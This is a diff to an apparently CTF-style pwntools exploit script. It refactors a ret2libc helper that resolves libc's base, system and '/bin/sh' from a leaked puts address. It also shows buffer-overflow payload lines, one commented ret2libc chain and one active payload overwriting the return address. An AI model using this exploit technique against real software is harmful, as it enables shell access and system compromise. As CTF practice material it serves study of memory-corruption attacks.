@@ -12,12 +12,15 @@ import sys, subprocess, warnings, os
 
 from pwnlib.term.term import put
 
-def ret2libc(leak,func,binary=null):
-    libc         = LibcSearcher(func,leak)               if binary == null else binary
-    libc.address = leak - libc.dump(func)                if binary == null else leak-libc.sym[func]
+def ret2libc(addr,func,binary=null):
+    libc         = LibcSearcher(func,addr)               if binary == null else binary
+    libc.address = addr - libc.dump(func)                if binary == null else addr-libc.sym[func]
     system       = libc.address+libc.dump('system')      if binary == null else libc.sym['system']
     binsh        = libc.address+libc.dump('str_bin_sh')  if binary == null else next(libc.search(b'/bin/sh'))
-    return  (system,binsh)
+    leak("libc_base", libc.address)
+    leak("system", system)
+    leak("binsh", binsh)
+    return(system, binsh)
 
 def hack(pwn):
     global io,binary,libc
@@ -82,8 +85,6 @@ puts_addr = l32()
 leak("puts",puts_addr)
 
 system,binsh = ret2libc(puts_addr,"puts",libc)
-leak("system",system)
-leak("binsh",binsh)
 
 # payload = b"b"*0x6c + b"wood" + p32(system) + p32(0) + p32(binsh)
 payload = b"b"*0x6c + b"wood" + p32(0x080485CB) + p32(0) + p32(0xDEADBEEF) + p32(0xDEADC0DE)
